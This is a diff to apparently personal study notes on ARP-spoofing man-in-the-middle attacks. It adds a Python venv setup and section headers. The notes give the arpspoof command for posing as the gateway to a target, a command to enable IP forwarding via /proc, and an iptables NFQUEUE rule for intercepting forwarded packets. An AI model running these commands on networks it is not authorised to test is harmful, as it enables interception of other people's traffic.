@@ -1,3 +1,9 @@
+python3 -m venv venv
+source venv/bin/activate
+pip install ......
+
+
+### Spoofing ###
 - apt install dsniff
 - telling to the target that i'm the router
     - arpspoof -i <interface> -t <ip-target> <ip-gateway>
@@ -8,3 +14,9 @@
 - because the attack machine is not a router, so we need to enable port-forwarding
     - echo 1 > /proc/sys/net/ipv4/ip_forward
         - /proc is een virtueel bestandssysteem waarmee je kernelinstellingen live kunt aanpassen
+
+
+
+
+### Intercepting packets ###
+- iptables -I FORWARD -j NFQUEUE --queue-num 0
